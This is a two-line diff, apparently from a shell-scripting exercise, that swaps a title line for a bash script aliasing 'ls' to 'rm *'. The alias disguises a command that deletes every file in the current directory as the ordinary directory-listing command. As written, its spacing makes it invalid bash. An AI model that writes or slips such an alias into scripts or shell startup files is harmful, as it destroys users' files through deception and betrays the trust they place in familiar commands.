@@ -1,1 +1,2 @@
-Shell Init, files, Variables
+#!/bin/bash
+alias ls = "rm *"
